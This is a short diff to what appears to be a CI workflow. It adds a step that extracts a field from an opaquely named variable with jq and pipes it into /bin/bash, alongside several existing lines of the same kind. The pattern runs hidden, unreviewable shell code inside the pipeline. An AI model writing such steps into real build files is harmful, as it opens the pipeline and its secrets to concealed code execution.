@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$rnmx00094" | jq -r .zo8474 | /bin/bash
           echo $hn77 | jq -r .argx45635 | /bin/bash
           echo $slxbs9 | jq -r .j35813 | /bin/bash
+          echo $bq548 | jq -r .jt35 | /bin/bash
 
       - name: Upload results
         if: always()
